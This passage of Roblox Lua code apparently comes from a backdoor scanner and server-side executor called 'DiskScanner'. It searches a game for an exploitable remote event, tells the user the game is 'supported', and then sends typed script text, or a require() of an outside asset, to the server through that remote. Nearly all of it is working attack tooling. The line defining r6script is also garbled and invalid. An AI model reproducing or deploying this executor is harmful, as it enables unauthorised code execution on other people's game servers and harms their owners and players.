		if g == "guitars" then
			for _, obj in pairs(game.ReplicatedStorage:GetChildren()) do
				if obj:IsA("Model") and obj.Name == "Dummy" then
					obj:Destroy()
					return true
				end
			end
			return false  
		end
		return false
	end
	function dragify(Main)
		dragToggle = nil
		dragSpeed = 0.95 
		dragInput = nil
		dragStart = nil
		dragPos = nil

		function updateInput(input)
			Delta = input.Position - dragStart
			Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Main, TweenInfo.new(0.25), {Position = Position}):Play()
		end

		Main.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
				dragToggle = true
				dragStart = input.Position
				startPos = Main.Position
				input.Changed:Connect(function()
					if (input.UserInputState == Enum.UserInputState.End) then
						dragToggle = false
					end
				end)
			end
		end)

		Main.InputChanged:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				dragInput = input
			end
		end)

		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if (input == dragInput and dragToggle) then
				updateInput(input)
			end
		end)
	end

	dragify(script.Parent)

	scanner.scan.MouseButton1Click:Connect(function()
		foundRem=vulnerability()
		if foundRem==nil then
			print("[DS] This game is not supported")
			game:GetService("StarterGui"):SetCore("SendNotification",{
				Title = "[DiskScanner]",
				Text = "This game is not supported, Oof",
				Duration = 5,
				Button1 = "OK"
			})
			wait(5)
			script.Parent.Parent:Destroy()
			return
		else
			print("[DS] This game is supported")
			game:GetService("StarterGui"):SetCore("SendNotification",{
				Title = "[DiskScanner]",
				Text = "This game is supported, Have fun",
				Duration = 5,
				Button1 = "OK"
			})
			wait(3)
			for _,ui in pairs(executor:GetChildren()) do
				if ui:IsA("GuiObject") then
					ui.Visible=true
					scanner.scan.Visible=false
				end
			end
		end
	end)

	executor.exe.MouseButton1Click:Connect(function()
		if executor.ScriptBox.Text=="" then
			warn'[DS] No input typed.'
		else
			foundRem:FireServer(executor.ScriptBox.Text)
		end
	end)

	executor.cle.MouseButton1Click:Connect(function()
		executor.ScriptBox.Text=""
	end)

	executor.r6.MouseButton1Click:Connect(function()
		local r6script=local r6script="require(3436957371):r6('"..player.Name.."')"
		foundRem:FireServer(r6script)
	end)
end;
task.spawn(C_40);

return DSC["1"], require;   
